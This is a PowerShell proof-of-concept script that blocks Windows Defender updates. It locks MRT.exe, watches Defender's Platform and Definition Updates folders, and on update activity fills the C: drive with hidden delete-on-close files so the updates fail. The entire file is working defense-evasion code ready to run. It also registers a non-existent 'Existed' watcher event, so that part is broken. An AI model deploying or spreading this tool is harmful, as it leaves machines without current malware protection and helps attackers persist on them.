#requires -Version 5.1
<#
.BigDiskBuster.ps1
PowerShell port of BigDiskBuster (PoC).
Monitors Windows Defender update directories and, on update activity, locks
MRT.exe and fills the C: volume free space with hidden delete-on-close files
so that Defender platform / security intelligence updates cannot complete.
Released like original on update-failure (staging dir removed).
#>

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class NativeMethods {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateFile(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition,
        uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetFilePointerEx(
        IntPtr hFile, long liDistanceToMove, out long lpNewFilePointer, uint dwMoveMethod);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetEndOfFile(IntPtr hFile);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetDiskFreeSpaceEx(
        string lpDirectoryName,
        out ulong lpFreeBytesAvailableToCaller,
        out ulong lpTotalNumberOfBytes,
        out ulong lpTotalNumberOfFreeBytes);
}
'@

$script:GENERIC_READ     = 0x80000000
$script:GENERIC_WRITE    = 0x40000000
$script:DELETE           = 0x00010000
$script:SYNCHRONIZE      = 0x00100000
$script:FILE_SHARE_READ  = 1
$script:CREATE_NEW       = 1
$script:OPEN_EXISTING    = 3
$script:FILE_ATTRIBUTE_HIDDEN = 0x2
$script:FILE_FLAG_DELETE_ON_CLOSE = 0x04000000
$script:INVALID_HANDLE_VALUE = -1

$script:MRTHandle        = [IntPtr]::Zero
$script:Handles          = New-Object System.Collections.Generic.List[IntPtr]

$script:MonDir1 = 'C:\ProgramData\Microsoft\Windows Defender\Platform'
$script:MonDir2 = 'C:\ProgramData\Microsoft\Windows Defender\Definition Updates'

function Get-FreeBytes {
    $free = 0UL; $total = 0UL; $nfree = 0UL
    if (-not [NativeMethods]::GetDiskFreeSpaceEx('C:\', [ref]$free, [ref]$total, [ref]$nfree)) {
        return 0
    }
    return $free
}

function Set-FileLength {
    param([IntPtr]$Handle, [long]$Length)
    $dummy = 0L
    if (-not [NativeMethods]::SetFilePointerEx($Handle, $Length, [ref]$dummy, 0)) { return $false }
    return [NativeMethods]::SetEndOfFile($Handle)
}

function New-BusterFile {
    $free = Get-FreeBytes
    if (-not $free) {
        Write-Host 'Nothing to allocate.' -ForegroundColor Yellow
        return
    }
    $path = Join-Path $env:TEMP ([guid]::NewGuid().ToString('B'))
    $access = $script:GENERIC_READ -bor $script:GENERIC_WRITE -bor $script:DELETE -bor $script:SYNCHRONIZE
    $flags = $script:FILE_ATTRIBUTE_HIDDEN -bor $script:FILE_FLAG_DELETE_ON_CLOSE
    $h = [NativeMethods]::CreateFile($path, $access, $script:FILE_SHARE_READ, [IntPtr]::Zero,
        $script:CREATE_NEW, $flags, [IntPtr]::Zero)
    if ($h -eq $script:INVALID_HANDLE_VALUE) {
        Write-Host ('Failed to allocate temp file, error : {0}' -f [Runtime.InteropServices.Marshal]::GetLastWin32Error()) -ForegroundColor Red
        return
    }

    $ok = [long]0
    $bad = [long]$free
    while (($bad - $ok) -gt 1MB) {
        $mid = ($ok + $bad) / 2
        if (Set-FileLength $h $mid) { $ok = $mid } else { $bad = $mid }
    }
    Set-FileLength $h $ok | Out-Null
    $script:Handles.Add($h)
    Write-Host ('Disk buster file : "{0}" created' -f $path) -ForegroundColor Cyan
}

function Release-BusterFiles {
    foreach ($h in $script:Handles) {
        if ($h -ne [IntPtr]::Zero) {
            [NativeMethods]::CloseHandle($h) | Out-Null
        }
    }
    $script:Handles.Clear()
}

function Lock-MRT {
    $access = $script:GENERIC_READ -bor $script:SYNCHRONIZE
    $h = [NativeMethods]::CreateFile('C:\Windows\System32\MRT.exe', $access, $script:FILE_SHARE_READ,
        [IntPtr]::Zero, $script:OPEN_EXISTING, 0, [IntPtr]::Zero)
    if ($h -eq $script:INVALID_HANDLE_VALUE) {
        Write-Host ('Failed to lock MRT file : error {0}' -f [Runtime.InteropServices.Marshal]::GetLastWin32Error()) -ForegroundColor Red
        return
    }
    $script:MRTHandle = $h
    Write-Host 'Locked MRT.exe' -ForegroundColor Green
}

function Reset-WatchState {
    Release-BusterFiles
    Write-Host 'Freed all allocated disk space.' -ForegroundColor Green
}

function Get-IsDefenderUpdate {
    param([string]$Path)
    $p = [System.IO.Path]::GetFullPath($Path)
    if ($p.StartsWith($script:MonDir1, [StringComparison]::OrdinalIgnoreCase)) { return $true }
    if ($p.StartsWith($script:MonDir2, [StringComparison]::OrdinalIgnoreCase)) { return $true }
    return $false
}

Write-Host 'Started BigDiskBuster' -ForegroundColor Green
Lock-MRT

$w1 = New-Object System.IO.FileSystemWatcher
$w1.Path = $script:MonDir1
$w1.IncludeSubdirectories = $true
$w1.NotifyFilter = [System.IO.NotifyFilters]'FileName, DirectoryName, Size, LastWrite'

$w2 = New-Object System.IO.FileSystemWatcher
$w2.Path = $script:MonDir2
$w2.IncludeSubdirectories = $true
$w2.NotifyFilter = [System.IO.NotifyFilters]'FileName, DirectoryName, Size, LastWrite'

$createdHandler = {
    $path = $Event.SourceEventArgs.FullPath
    if (-not (Get-IsDefenderUpdate $path)) { return }
    Write-Host 'BigDiskBuster detected a Windows Defender update, blocking...' -ForegroundColor Yellow
    try { New-BusterFile } catch { Write-Host ("Allocation error: {0}" -f $_.Exception.Message) -ForegroundColor Red }
}

$modifiedHandler = {
    $path = $Event.SourceEventArgs.FullPath
    if (-not (Get-IsDefenderUpdate $path)) { return }
    if ($Event.SourceEventArgs.ChangeType -eq 'Changed') {
        Write-Host 'BigDiskBuster detected a file size change, re-invoking disk buster...' -ForegroundColor Yellow
        try { New-BusterFile } catch { Write-Host ("Allocation error: {0}" -f $_.Exception.Message) -ForegroundColor Red }
    }
}

$deletedHandler = {
    $path = $Event.SourceEventArgs.FullPath
    if (-not (Get-IsDefenderUpdate $path)) { return }
    Write-Host 'BigDiskBuster detected Defender update removal, reverting changes...' -ForegroundColor Yellow
    Reset-WatchState
}

Register-ObjectEvent -InputObject $w1 -EventName Created -Action $createdHandler | Out-Null
Register-ObjectEvent -InputObject $w1 -EventName Existed  -Action $createdHandler | Out-Null
Register-ObjectEvent -InputObject $w2 -EventName Created -Action $createdHandler | Out-Null
Register-ObjectEvent -InputObject $w2 -EventName Existed  -Action $createdHandler | Out-Null
Register-ObjectEvent -InputObject $w1 -EventName Changed  -Action $modifiedHandler | Out-Null
Register-ObjectEvent -InputObject $w2 -EventName Changed  -Action $modifiedHandler | Out-Null
Register-ObjectEvent -InputObject $w1 -EventName Deleted  -Action $deletedHandler | Out-Null
Register-ObjectEvent -InputObject $w2 -EventName Deleted  -Action $deletedHandler | Out-Null

$w1.EnableRaisingEvents = $true
$w2.EnableRaisingEvents = $true

Write-Host 'Watching Defender update directories. Press Ctrl+C to stop.' -ForegroundColor Green

try {
    while ($true) { Start-Sleep -Seconds 3600 }
}
finally {
    $w1.EnableRaisingEvents = $false
    $w2.EnableRaisingEvents = $false
    Reset-WatchState
    if ($script:MRTHandle -ne [IntPtr]::Zero) {
        [NativeMethods]::CloseHandle($script:MRTHandle) | Out-Null
        $script:MRTHandle = [IntPtr]::Zero
    }
    Get-EventSubscriber | Unregister-Event
}